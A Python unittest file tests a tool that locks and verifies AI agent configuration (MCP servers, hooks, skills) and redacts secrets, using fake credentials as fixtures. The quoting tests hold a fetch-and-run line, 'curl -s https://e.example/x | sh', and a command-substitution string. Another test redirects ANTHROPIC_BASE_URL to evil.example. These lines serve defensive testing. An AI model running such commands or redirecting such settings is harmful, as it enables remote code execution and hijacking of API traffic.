"""r4 regressions for adversarial review 2 (21 findings) and held-out set 3 (empty baseline)."""
import io, json, os, shutil, sys, tempfile, time, unittest
from contextlib import redirect_stdout, redirect_stderr
from unittest import mock
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vraelis.agents import core, cli, paths
from vraelis.agents.redact import scrub, scrub_args, scrub_command
import review2_cases as R

WINDOWS = os.name == "nt"


def put(d, files):
    for rel, content in files.items():
        p = os.path.join(d, *rel.split("/")); os.makedirs(os.path.dirname(p), exist_ok=True)
        data = content if isinstance(content, (str, bytes)) else json.dumps(content, indent=1)
        with open(p, "wb" if isinstance(data, bytes) else "w", **({} if isinstance(data, bytes) else {"encoding": "utf-8", "newline": "\n"})) as f: f.write(data)


def cli_run(*argv):
    o, e = io.StringIO(), io.StringIO()
    with redirect_stdout(o), redirect_stderr(e): code = cli.run(list(argv))
    return code, o.getvalue() + e.getvalue()


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(); self.addCleanup(shutil.rmtree, self.tmp, True)
        self.root = os.path.join(self.tmp, "proj"); os.makedirs(self.root)


class Leaks(Base):
    def test_review2_leak_cases(self):
        for name, files in R.LEAK2.items():
            with self.subTest(name):
                d = os.path.join(self.tmp, name); os.makedirs(d); put(d, files)
                c1, o1 = cli_run("lock", d, "--json")
                lf = os.path.join(d, core.LOCKFILE); raw = open(lf, encoding="utf-8").read() if os.path.exists(lf) else ""
                c2, o2 = cli_run("verify", d, "--json")
                for s in ("FAKEPW", "Correct-Horse"): self.assertNotIn(s, raw + o1 + o2)


class Detection(Base):
    GAP = {"github_readonly_header": "header values are not recorded", "uv_run_entrypoint": "no local file named",
           "url_fragment": "parts of a URL redacted"}

    def test_review2_detect_cases(self):
        for name, before, after in R.DETECT2:
            with self.subTest(name):
                d = os.path.join(self.tmp, name); os.makedirs(d); put(d, before)
                lp = os.path.join(self.tmp, name + ".json"); core.write_lock(d, core.lock(d), lp)
                self.assertEqual(core.verify(d, lp)["verdict"], "UNCHANGED")
                put(d, after); r = core.verify(d, lp)
                if name == "cmd_c_compound" and not WINDOWS:  # a backslash path is not a path off Windows: listed as not covered
                    self.assertEqual(r["verdict"], "UNCHANGED"); self.assertTrue(any("no local file named" in g for g in r["coverage_gaps"])); continue
                if name in self.GAP:
                    self.assertEqual(r["verdict"], "UNCHANGED"); self.assertTrue(any(self.GAP[name] in g for g in r["coverage_gaps"]), r["coverage_gaps"])
                else: self.assertEqual(r["verdict"], "CHANGED", (name, r["coverage_gaps"]))


class TrustBoundary(Base):  # H1
    def setUp(self):
        super().setUp()
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "srv", "env": {"DB_PASSWORD": "Correct-Horse-FAKEPW"}}}}})
        self.lp = os.path.join(self.tmp, "l.json"); core.write_lock(self.root, core.lock(self.root), self.lp)

    def tamper(self, **kw):
        d = json.load(open(self.lp, encoding="utf-8")); d.update(kw); json.dump(d, open(self.lp, "w", encoding="utf-8"))

    def test_pin_env_added_in_lockfile_refused(self):
        self.tamper(pin_env=["DB_PASSWORD"]); r = core.verify(self.root, self.lp)
        self.assertEqual(r["verdict"], "CANT_VERIFY"); self.assertNotIn("FAKEPW", json.dumps(r))

    def test_extra_config_added_in_lockfile_never_read(self):
        out = os.path.join(self.tmp, "victim.json"); put(self.tmp, {"victim.json": {"mcpServers": {"gh": {"command": "x", "env": {"T": "ghp_" + "F" * 36}}}}})
        self.tamper(extra_configs=[out.replace(os.sep, "/")])
        with mock.patch("builtins.open", wraps=open) as o:
            r = core.verify(self.root, self.lp)
        self.assertEqual(r["verdict"], "CANT_VERIFY")
        self.assertFalse([c for c in o.call_args_list if c.args and "victim" in str(c.args[0])])

    def test_pinned_values_never_in_verify_output(self):
        lp = os.path.join(self.tmp, "p.json"); core.write_lock(self.root, core.lock(self.root, pin_env=["DB_PASSWORD"]), lp)
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "srv", "env": {"DB_PASSWORD": "Other-FAKEPW"}}}}})
        code, out = cli_run("verify", self.root, "--lockfile", lp, "--pin-env", "DB_PASSWORD")
        self.assertEqual(code, 1); self.assertNotIn("FAKEPW", out)
        code, out = cli_run("verify", self.root, "--lockfile", lp, "--pin-env", "DB_PASSWORD", "--json")
        self.assertNotIn("FAKEPW", out)


    def test_pinned_values_not_in_server_added_or_removed_output(self):
        lp = os.path.join(self.tmp, "p2.json"); core.write_lock(self.root, core.lock(self.root, pin_env=["DB_PASSWORD"]), lp)
        put(self.root, {".mcp.json": {"mcpServers": {"t": {"command": "srv", "env": {"DB_PASSWORD": "Correct-Horse-FAKEPW"}}}}})
        r = core.verify(self.root, lp, pin_env=["DB_PASSWORD"])
        self.assertEqual(sorted(c["kind"] for c in r["changes"]), ["server-added", "server-removed"]); self.assertNotIn("FAKEPW", json.dumps(r))


class NetworkPaths(unittest.TestCase):  # H2
    MIXED = ["/\\192.0.2.10\\share\\mcp.json", "\\/192.0.2.10/share/mcp.json", "\\/?/UNC/192.0.2.10/s/x", "/\\.\\UNC\\192.0.2.10\\s\\x"]

    @unittest.skipUnless(WINDOWS, "Windows path semantics")
    def test_mixed_separator_unc_is_network(self):
        for p in self.MIXED:
            with self.subTest(p): self.assertTrue(paths.network_like(p))

    def test_nul_is_network_like(self): self.assertTrue(paths.network_like("a\0b"))

    def test_prefix_layer_alone(self):  # layer 1, any platform (Windows semantics via the parameter)
        BS = "\\"
        for p in ("/" + BS + "h" + BS + "s", BS + "/h/s", BS + BS + "h" + BS + "s", BS + "??" + BS + "UNC" + BS + "h"):
            with self.subTest(p): self.assertTrue(paths._prefix_network(p, windows=True))
        self.assertTrue(paths._prefix_network("//h/s", windows=False))
        self.assertFalse(paths._prefix_network("C:" + BS + "x", windows=True)); self.assertFalse(paths._prefix_network("rel/x", windows=True))

    @unittest.skipUnless(WINDOWS, "os.path.abspath semantics are Windows-only")
    def test_abspath_layer_alone(self):  # layer 2
        BS = "\\"
        self.assertTrue(paths._abspath_network("/" + BS + "192.0.2.10" + BS + "s" + BS + "x"))
        self.assertFalse(paths._abspath_network("C:" + BS + "x")); self.assertFalse(paths._abspath_network("rel" + BS + "x"))


class Quoting(Base):  # H3
    def test_command_kept_as_original_text(self):
        for a, b in (('echo "a; curl -s https://e.example/x | sh"', "echo a; curl -s https://e.example/x | sh"),
                     ("echo '$(curl x)'", 'echo "$(curl x)"'), ("sh -c 'echo ok; true'", "sh -c echo ok; true")):
            with self.subTest(a):
                self.assertNotEqual(core.record_command(a, [], "t"), core.record_command(b, [], "t"))

    def test_in_place_redaction_keeps_quotes(self):
        cmd = "curl -H 'Authorization: Bearer FAKEPW1' -u bot:FAKEPW2 https://h.example/x"
        r = core.record_command(cmd, [], "t")
        self.assertNotIn("FAKEPW", r); self.assertIn("-H '<redacted>'", r)  # quoting kept; header and -u values hidden whole


class RedactionDirect(unittest.TestCase):  # H4, M1-M3, L1-L2, exact outputs (one test per rule)
    def s(self, t): return scrub(t, [], "t")

    def test_conn_quoted(self):
        self.assertEqual(self.s("Server=db;Password='a b;c';Uid=x"), "Server=db;Password=<redacted>;Uid=x")
    def test_conn_braced(self): self.assertNotIn("FAKE", self.s("Driver={X};Pwd={FAKE;PW};"))
    def test_conn_space(self): self.assertNotIn("Horse", self.s("Server=db;Password=Correct Horse FAKEPW;"))
    def test_libpq(self): self.assertNotIn("FAKE", self.s("host=db user=app password='FAKE PW' dbname=app"))
    def test_oracle_exact(self): self.assertEqual(self.s("scott/FAKEPW@db.example:1521/ORCL"), "scott/<redacted>@db.example:1521/ORCL")
    def test_dsn_exact(self): self.assertEqual(self.s("app:FAKEPW@db.example:5432/app"), "app:<redacted>@db.example:5432/app")
    def test_dsn_dotless_exact(self): self.assertEqual(self.s("db/user:FAKEPW1@host"), "db/user:<redacted>@host")
    def test_redis_empty_user(self): self.assertEqual(self.s(":FAKEPW1@cache.example:6379"), ":<redacted>@cache.example:6379")
    def test_protocol_relative(self): self.assertEqual(self.s("//app:FAKEPW@db.example/app"), "//app:<redacted>@db.example/app")
    def test_percent_encoded(self): self.assertNotIn("FAKEPW", self.s("postgresql%3A%2F%2Fapp%3AFAKEPW%40db.example%2Fapp"))
    def test_pem(self): self.assertNotIn("MIIE", self.s("-----BEGIN RSA PRIVATE KEY-----\nMIIEabc/+=\n-----END RSA PRIVATE KEY-----"))
    def test_docker_digest_kept(self):
        d = "ghcr.io/o/img:latest@sha256:" + "a" * 64; self.assertEqual(self.s(d), d)
    def test_package_spec_kept(self):
        for p in ("@scope/pkg@1.2.3", "files@1.2.0", "mcp-server-fetch==2025.1.1"): self.assertEqual(self.s(p), p)
    def test_permission_star_kept(self): self.assertEqual(self.s("Bash(npm run auth:*)"), "Bash(npm run auth:*)")
    def test_bypass_not_secret(self):
        self.assertEqual(core.record_value({"disableBypassPermissionsMode": "disable"}, [], "t"), {"disableBypassPermissionsMode": "disable"})
    def test_child_pw_and_basic(self):
        r = core.record_value({"auth": {"username": "bot", "pw": "FAKEPW", "basic": "Ym90OkZBS0VQVw=="}}, [], "t")
        self.assertNotIn("FAKEPW", json.dumps(r)); self.assertNotIn("Ym90", json.dumps(r))
    def test_names_and_keys_scrubbed(self):
        r = core.record_value({"https://bot:FAKEPW@h.example/x": 1, "env": {"API_KEY=ghp_" + "F" * 36: "v"}}, [], "t")
        self.assertNotIn("FAKEPW", json.dumps(r)); self.assertNotIn("ghp_FFF", json.dumps(r))
    def test_custom_headers_names_only(self):
        r = core.record_value({"customHeaders": {"X-Org": "FAKEPW"}}, [], "t"); self.assertEqual(r["customHeaders"]["names"], ["X-Org"])
    def test_url_fragment_kept_values_redacted(self):
        self.assertEqual(self.s("https://h.example/p#tenant=a"), "https://h.example/p#tenant=<redacted>")


class ArgContextDirect(unittest.TestCase):  # M2
    def a(self, args, prog=None): return scrub_args(args, [], "t", program=prog)
    def test_attached_p(self): self.assertEqual(self.a(["-pFAKEPW1x"]), ["-p<redacted>"])
    def test_attached_p_mysql(self): self.assertEqual(self.a(["-pab"], "mysql"), ["-p<redacted>"])
    def test_P_next(self): self.assertEqual(self.a(["-P", "FAKEPW1x"]), ["-P", "<redacted>"])
    def test_a_next(self): self.assertEqual(self.a(["-a", "FAKEPW1x"]), ["-a", "<redacted>"])
    def test_p_port_kept(self): self.assertEqual(self.a(["-p", "8080"]), ["-p", "8080"])
    def test_p_package_kept(self): self.assertEqual(self.a(["-p", "@scope/pkg@1.2.3"]), ["-p", "@scope/pkg@1.2.3"])
    def test_headers_two_values(self): self.assertEqual(self.a(["--headers", "X-Api-Key", "FAKEPW", "https://h.example"]), ["--headers", "<redacted>", "<redacted>", "https://h.example"])
    def test_program_flag(self): self.assertEqual(self.a(["-b", "sid=x"], "curl"), ["-b", "<redacted>"])
    def test_python_u_kept(self): self.assertEqual(self.a(["-u", "server.py"]), ["-u", "server.py"])


class OverlapDirect(unittest.TestCase):
    """Inputs only one guard handles (r4 Linux mutation run: four guards overlapped with others)."""
    def test_u_password_no_program(self): self.assertEqual(scrub_args(["-u", "bot:pw"], [], "t"), ["-u", "bot:<redacted>"])
    def test_unparseable_url(self):
        from vraelis.agents import redact
        self.assertEqual(redact._scrub_url("https://h.example:99999[x/", [], "t"), "<redacted>")
    def test_protocol_relative_dotless_short(self): self.assertEqual(scrub("//app:pw@db/x", [], "t"), "//app:<redacted>@db/x")

    def test_relative_link_leaving_project(self):
        d = tempfile.mkdtemp(); self.addCleanup(shutil.rmtree, d, True)
        root = os.path.join(d, "proj"); os.makedirs(root); os.makedirs(os.path.join(d, "o")); open(os.path.join(d, "o", "f"), "w").write("x")
        try: os.symlink(os.path.join("..", "o"), os.path.join(root, "l"))
        except (OSError, NotImplementedError): self.skipTest("symlinks not available")
        with self.assertRaises(paths.Outside) as cm: paths.resolve(root, "l/f")
        self.assertIn("link leaves the project", str(cm.exception))


class LinearTime(unittest.TestCase):  # M7
    def test_adversarial_inputs_fast(self):
        for pat in ("-key", "key", "x-key-", "a-", "user:", "a/", "p@", "=key;", "Authorization: ", "x-api-key-", "%41", "a:b@"):
            s = pat * (8000 // len(pat)); t = time.time(); scrub(s, [], "t")
            self.assertLess(time.time() - t, 1.0, pat)

    def test_overlong_value_not_recorded(self):
        r = scrub("x" * 9000, [], "t"); self.assertTrue(r.startswith("<value not recorded"))


class FilesDirect(Base):
    def test_hard_link_not_read(self):  # M8
        out = os.path.join(self.tmp, "pin.txt"); open(out, "w").write("4821\n")
        put(self.root, {".claude/skills/a/SKILL.md": "x"}); os.link(out, os.path.join(self.root, ".claude", "skills", "a", "notes.md"))
        doc = core.lock(self.root)
        self.assertNotIn("sha256", doc["instruction_files"][".claude/skills/a/notes.md"])
        self.assertTrue(any("hard links" in g for g in doc["coverage_gaps"]))

    def test_envrc_and_dev_vars_not_read(self):  # L5
        for n in (".envrc", ".dev.vars", ".pgpass", ".env.production"):
            with self.subTest(n):
                d = os.path.join(self.tmp, n.strip(".").replace(".", "_")); put(d, {n: "SECRET=x", ".mcp.json": {"mcpServers": {"s": {"command": "srv", "args": [n]}}}})
                self.assertEqual(core.lock(d)["launched_files"], {})

    @unittest.skipUnless(WINDOWS, "8.3 names are Windows-only")
    def test_short_name_alias_not_read(self):
        import ctypes
        put(self.root, {".env.production": "API_KEY=x"}); buf = ctypes.create_unicode_buffer(512)
        ctypes.windll.kernel32.GetShortPathNameW(os.path.join(self.root, ".env.production"), buf, 512)
        short = os.path.basename(buf.value)
        if short == ".env.production": self.skipTest("8.3 names disabled on this volume")
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "dotenv", "args": ["-e", short]}}}})
        self.assertEqual(core.lock(self.root)["launched_files"], {})

    def test_launch_forms_resolved(self):  # M6
        put(self.root, {"pre.js": "1", "srv/main.py": "1", "server/index.js": "1", "scripts/guard.sh": "1", "src/my_server/__main__.py": "1",
                        "package.json": json.dumps({"scripts": {"start": "node dist/index.js"}}), "dist/index.js": "1",
                        ".mcp.json": {"mcpServers": {
                            "a": {"command": "node", "args": ["--require=./pre.js", "x"]},
                            "b": {"command": "uv", "args": ["--directory=srv", "run", "main.py"]},
                            "c": {"command": "bash", "args": ["-c", "node server/index.js"]},
                            "d": {"command": "python", "args": ["-m", "my_server"]},
                            "e": {"command": "npm", "args": ["run", "start"]}}},
                        ".claude/settings.json": {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "cd scripts && ./guard.sh"}]}]}}})
        lf = core.lock(self.root)["launched_files"]
        for p in ("pre.js", "srv/main.py", "server/index.js", "scripts/guard.sh", "src/my_server/__main__.py", "package.json", "dist/index.js"):
            self.assertIn(p, lf)

    def test_interpreter_without_file_gap(self):
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "uv", "args": ["run", "my-server"]}}}})
        self.assertTrue(any("no local file named by this launch" in g for g in core.lock(self.root)["coverage_gaps"]))


class Pins(unittest.TestCase):  # L6
    def test_floating_specs(self):
        for spec in ("pkg@beta", "pkg@canary", "pkg@1", "pkg@1.2", "pkg@latest", "pkg@^1.2.0", "py==1.*"):
            with self.subTest(spec): self.assertEqual(core.package_pins("npx" if "==" not in spec else "uvx", [spec])[0][1], "floating")
    def test_exact_specs(self):
        for prog, spec in (("npx", "pkg@1.2.3"), ("npx", "@s/p@1.2.3-beta.1"), ("uvx", "p==2025.1.1"), ("uvx", "p==1.0rc1")):
            with self.subTest(spec): self.assertEqual(core.package_pins(prog, [spec])[0][1], "pinned")


class Misc(Base):
    def test_empty_baseline(self):  # held-out set 3
        lp = os.path.join(self.tmp, "l.json"); core.write_lock(self.root, core.lock(self.root), lp)
        put(self.root, {".claude/settings.json": {"hooks": {}}})
        self.assertEqual(core.verify(self.root, lp)["changes"][0]["kind"], "settings-added")

    def test_bom_lockfile(self):  # L8
        put(self.root, {".mcp.json": {"mcpServers": {}}}); lp = os.path.join(self.tmp, "l.json")
        core.write_lock(self.root, core.lock(self.root), lp)
        data = open(lp, "rb").read(); open(lp, "wb").write(b"\xef\xbb\xbf" + data)
        self.assertEqual(core.verify(self.root, lp)["verdict"], "UNCHANGED")

    def test_nul_arg_locks(self):
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "srv", "args": ["a\u0000b"]}}}}); core.lock(self.root)

    def test_settings_env_pinnable(self):  # M5
        put(self.root, {".claude/settings.json": {"env": {"ANTHROPIC_BASE_URL": "https://api.example"}}}); lp = os.path.join(self.tmp, "l.json")
        core.write_lock(self.root, core.lock(self.root, pin_env=["ANTHROPIC_BASE_URL"]), lp)
        put(self.root, {".claude/settings.json": {"env": {"ANTHROPIC_BASE_URL": "https://evil.example"}}})
        r = core.verify(self.root, lp, pin_env=["ANTHROPIC_BASE_URL"])
        self.assertIn("pinned-env-changed", [c["kind"] for c in r["changes"]]); self.assertNotIn("evil", json.dumps(r))

    def test_unicode_text_output_does_not_crash(self):  # M9
        put(self.root, {".mcp.json": {"mcpServers": {"服务器": {"command": "a"}}}}); lp = os.path.join(self.tmp, "l.json")
        core.write_lock(self.root, core.lock(self.root), lp); put(self.root, {".mcp.json": {"mcpServers": {"服务器": {"command": "b"}}}})
        buf = io.TextIOWrapper(io.BytesIO(), encoding="cp1252")
        with mock.patch("sys.stdout", buf): code = cli.run(["verify", self.root, "--lockfile", lp])
        self.assertEqual(code, 1)

    def test_dotdot_after_link_resolved_after_link(self):  # L3
        try: os.symlink("x", os.path.join(self.tmp, "probe")); os.remove(os.path.join(self.tmp, "probe"))
        except (OSError, NotImplementedError): self.skipTest("symlinks not available")
        put(self.root, {"node_modules/pkg/bin/.keep": "", "node_modules/pkg/server.js": "real", "server.js": "decoy"})
        os.symlink(os.path.join("node_modules", "pkg", "bin"), os.path.join(self.root, "bin"))
        real = paths.resolve(self.root, "bin/../server.js")
        self.assertEqual(os.path.normcase(real), os.path.normcase(os.path.join(self.root, "node_modules", "pkg", "server.js")))

    def test_command_path_with_space(self):  # L4
        put(self.root, {"My Tools/server.sh": "x", ".mcp.json": {"mcpServers": {"s": {"command": os.path.join(self.root, "My Tools", "server.sh")}}}})
        self.assertIn("My Tools/server.sh", core.lock(self.root)["launched_files"])


if __name__ == "__main__":
    unittest.main()


class OutputClobber(Base):  # Codex AL-O01 (r5)
    def setUp(self):
        super().setUp()
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "node", "args": ["server.js"]}}}, "server.js": "console.log(1)\n",
                        ".claude/skills/a/SKILL.md": "x"})
        self.before = {p: open(os.path.join(self.root, p), "rb").read() for p in (".mcp.json", "server.js", ".claude/skills/a/SKILL.md")}

    def test_out_inside_project_refused_and_inputs_untouched(self):
        for target in (".mcp.json", "server.js", ".claude/skills/a/SKILL.md", "sub/new.json", "addonlock2.json"):
            with self.subTest(target):
                code, out = cli_run("lock", self.root, "--out", os.path.join(self.root, *target.split("/")), "--json")
                self.assertEqual(code, 2); self.assertFalse(json.loads(out)["locked"])
                for p, b in self.before.items(): self.assertEqual(open(os.path.join(self.root, p), "rb").read(), b, p)

    def test_default_and_outside_out_allowed(self):
        self.assertEqual(cli_run("lock", self.root)[0], 0)
        self.assertEqual(cli_run("lock", self.root, "--out", os.path.join(self.root, core.LOCKFILE))[0], 0)
        self.assertEqual(cli_run("lock", self.root, "--out", os.path.join(self.tmp, "elsewhere.json"))[0], 0)
        for p, b in self.before.items(): self.assertEqual(open(os.path.join(self.root, p), "rb").read(), b, p)


class TransitiveGap(Base):  # r5: held-out set 4 cases 17/20 were silent
    def test_loaded_files_gap_listed(self):
        put(self.root, {".mcp.json": {"mcpServers": {"s": {"command": "node", "args": ["tools/launch.js"]}}}, "tools/launch.js": "import('./server.js')", "tools/server.js": "1"})
        lp = os.path.join(self.tmp, "l.json"); core.write_lock(self.root, core.lock(self.root), lp)
        put(self.root, {"tools/server.js": "2"}); r = core.verify(self.root, lp)
        self.assertEqual(r["verdict"], "UNCHANGED")  # still not followed: the limit is stated, not removed
        self.assertTrue(any("tools/launch.js itself imports, sources or loads are not pinned" in g for g in r["coverage_gaps"]))
